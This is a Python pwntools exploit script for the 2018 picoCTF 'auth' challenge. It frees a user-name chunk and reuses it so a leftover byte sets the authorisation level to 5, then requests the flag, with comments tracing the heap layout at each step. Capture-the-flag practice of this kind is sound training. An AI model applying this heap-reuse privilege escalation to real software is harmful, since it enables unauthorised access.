#!/usr/bin/python2
from pwn import *

# Note: sizeof(struct user) === 16
#   Because char* (pointer) in 64-bit is 8-bytes
#       and auth_level_t (int) is 4-bytes.
#   But all the other values in the strcut are padded to the biggest length.
#   So auth_level_t is padded to 8-bytes.


def getProcess():
    is_remote = True
    if is_remote:
        return remote('2018shell1.picoctf.com', 45906)
    else:
        return process('../auth')

p = getProcess()

p.recvuntil('> ')
p.sendline('login %s%c' % ('A'*8, chr(5)))

# Memory layout:
#   The stack:
#       0x7ffffffee080: 0x0000000000604020 # pointer to the user strcut
#   The struct content:
#       0x604020: 0x0000000000604040       # name (duplicate of "AAAAAAAA\x05")
#       0x604028: 0x0000000000000000       # level 
#          ...
#       0x604040: 0x4242424241414141       
#       0x604048: 0x0000000000000031


p.recvuntil('> ')
p.sendline('reset')

# Memory layout stays the same, the user->name pointer is free and user is NULL
#       0x604040: 0x0000000000000000       # the name is freed but the next address stays the same   
#       0x604048: 0x0000000000000005

p.recvuntil('> ')
p.sendline('login a')

# The next malloc somehow is allocates on the last freed chunk (the user->name)
# Memory layout:
#   The strcut itself:
#       0x7ffffffee080: 0x0000000000604040 # pointer to the level struct
#   The struct content:
#       0x604040: 0x0000000000604060       # duplicate of "a"
#       0x604048: 0x0000000000000005       # level (stays the same)

# Success! level is 5

p.recvuntil('> ')
p.sendline('show')
p.recvuntil('Logged in as a [')

level = p.recvuntil(']', drop=True)
assert(level == '5')

p.recvuntil('> ')
p.sendline('get-flag')
print (p.recvuntil('Enter your command:', drop=True))